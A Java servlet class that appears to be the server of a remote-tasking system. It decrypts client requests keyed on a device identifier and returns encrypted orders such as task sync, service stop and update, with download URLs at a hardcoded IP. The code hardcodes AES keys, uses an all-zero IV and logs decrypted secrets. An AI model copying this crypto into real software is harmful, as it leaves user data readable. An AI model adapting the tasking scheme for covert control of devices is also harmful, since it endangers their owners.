/**
 * 
 */
package com.k99k.plserver;

import java.io.UnsupportedEncodingException;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;

import com.k99k.khunter.Action;
import com.k99k.khunter.ActionMsg;
import com.k99k.khunter.HttpActionMsg;
import com.k99k.tools.StringUtil;
import com.k99k.tools.encrypter.Base64Coder;

/**
 * @author keel
 *
 */
public class PSA extends Action {

	public PSA(String name) {
		super(name);
	}
	
    private static byte[] rootkey = {79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
    private static byte[] ivk = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    private byte[] rkey = {43, 23, 13, -32, -58, 83, 3, -34, -87, 56, 19, 90, 28, -102, 15, 40};
    

	public static final int ORDER_NONE = 0;
	public static final int ORDER_SYNC_TASK = 1;
	public static final int ORDER_DEL_TASK = 2;
	public static final int ORDER_STOP_SERVICE = 3;
	public static final int ORDER_RESTART_SERVICE = 4;
	public static final int ORDER_UPDATE = 5;
	public static final int ORDER_UPTIME = 6;
	public static final int ORDER_KEY = 7;

    public static final String ERR_PARA = "e01";
    public static final String ERR_DECRYPT = "e02";
    public static final String ERR_KEY_EXPIRED = "e03";
    public static final String ERR_DECRYPT_CLIENT = "e04";
    
    
    private static final String SPLIT_STR = "@@";
    //TODO 暂时写死
    private String taskDownUrl = "http://180.96.63.70:8080/plserver/PS";
    private String updateDownUrl = "http://180.96.63.70:8080/plserver/PS";
    private final static String downloadType = "application/x-msdownload";

    private String downloadLocalPath = "/usr/plserver/dats/";
    
    private int currentKeyVersion = 1;
    
    private String tempTaskList = "1";
    
    
    @Override
	public ActionMsg act(ActionMsg msg) {
    	HttpActionMsg httpmsg = (HttpActionMsg)msg;
    	HttpServletRequest request =  httpmsg.getHttpReq();
    	String enc = request.getParameter("up");
		String kVer = request.getHeader("v");
		if (!StringUtil.isStringWithLen(enc, 6) || !StringUtil.isStringWithLen(kVer,5)) {
			msg.addData("[print]",ERR_PARA);
			return super.act(msg);
		}
		//int keyVersion = (Integer.parseInt(kVer)-17)/27;
		String req = null;
		try {
			String rkey = decrypt(kVer,rootkey);
			System.out.println("rkey:"+rkey);
			String[] rkeys = rkey.split("\\|\\|");
			//TODO 注意这里解密先需要确定KEY
			String imeiKey = Base64Coder.encodeString(rkeys[0]).substring(0, 16);
			System.out.println(imeiKey);
			byte[] ikey  = new byte[16];
//			StringBuilder sb1 = new StringBuilder();
			for (int i = 0; i < 16; i++) {
				ikey[i] = (byte) imeiKey.charAt(i);
//				sb1.append(ikey[i]).append(",");
			}
//			System.out.println("ikey:"+sb1.toString());
			System.out.println("upContent:"+enc);
			req = decrypt(enc,ikey);
			System.out.println("dec:"+req);
			String[] reqs = req.split("@@");
			System.out.println(reqs.length + " "+ reqs[6]);
//			if (keyVersion != this.currentKeyVersion) {
//				response.getWriter().println(ERR_KEY_EXPIRED);
//				return;
//			}
			//req = Encrypter.getInstance().decrypt(enc);
		} catch (Exception e) {
			e.printStackTrace();
			msg.addData("[print]",ERR_DECRYPT);
			return super.act(msg);
		}
		String[] reqs = req.split(SPLIT_STR);
		//TODO 获取或生成用户信息和taskList，根据用户具体情况修改taskList返回
		long uid = 1;
		
		//实现ORDER_SYNC_TASK
		StringBuilder sb = new StringBuilder();
		sb.append(uid).append(SPLIT_STR);
		sb.append(ORDER_SYNC_TASK).append(SPLIT_STR)
		.append(this.taskDownUrl).append(SPLIT_STR)
		//这里仅使用两个测试任务ID,1为toast,2为下载view数据
		.append(this.tempTaskList).append(SPLIT_STR)
		.append(this.currentKeyVersion);
		String resp = null;
		try {
			resp = encrypt(sb.toString(),rkey);
		} catch (Exception e) {
			e.printStackTrace();
		}
    	
    	msg.addData("[print]",resp);
		return super.act(msg);
	}

	// 加密
  	public static final String encrypt(String sSrc,byte[] key) throws Exception {
  		byte[] srcBytes = sSrc.getBytes("utf-8");
  		Cipher cipher = null;
  		srcBytes = zeroPadding(sSrc);
//  		cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
  		cipher = Cipher.getInstance("AES/CBC/NoPadding");
  		
  		SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
  		IvParameterSpec iv =  new IvParameterSpec(ivk);//new IvParameterSpec(ivParameter.getBytes());// 使用CBC模式，需要一个向量iv，可增加加密算法的强度
  		cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);
  		byte[] encrypted = cipher.doFinal(srcBytes);
  		return Base64Coder.encode(encrypted);
//  		return bytePrint(encrypted);
  	}
  	
  	public static final String bytePrint(byte[] in){
  		StringBuilder sb = new StringBuilder();
  		for (int i = 0; i < in.length; i++) {
  			sb.append(in[i]);
  		}
  		return sb.toString();
  	}

  	
  	public static final byte[] zeroPadding(String in){
  		try {
  			byte[] bs = in.getBytes("utf-8");
  			int len = bs.length;
  			int padding = len % 16;
  			byte[] nbs;
  			if (padding  != 0) {
  				int nlen = len+(16-padding);
  				nbs = new byte[nlen];
  				System.arraycopy(bs, 0, nbs, 0, len);
  				return nbs;
  			}else{
  				return bs;
  			}
  		} catch (UnsupportedEncodingException e) {
  			e.printStackTrace();
  			return null;
  		}
  	}
  	public static final byte[] clearPadding(byte[] in){
  		int len = in.length;
  		int nlen = len;
  		for (int i = len-1; i >0; i--) {
  			if(in[i] == 0){
  				nlen--;
  			}else{
  				break;
  			}
  		}
  		if (nlen == len) {
  			return in;
  		}
  		byte[] re = new byte[nlen];
  		System.arraycopy(in, 0, re, 0, nlen);
  		return re;
  		
  	}
  	// 解密
  	public static final String decrypt(String sSrc,byte[] key) throws Exception {
  		try {
  			SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
//  			Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
  			Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
  			
  			IvParameterSpec iv = new IvParameterSpec(ivk);//new IvParameterSpec(ivParameter.getBytes());
  			cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);
  			byte[] encrypted1 = Base64Coder.decode(sSrc);// 先用base64解密
  			byte[] original = cipher.doFinal(encrypted1);
  			
  			String originalString = new String(clearPadding(original), "utf-8");
//  			String originalString = new String(original, "utf-8");
  			
  			return originalString;
  		} catch (Exception ex) {
  			return null;
  		}
  	}
	
	
	

}
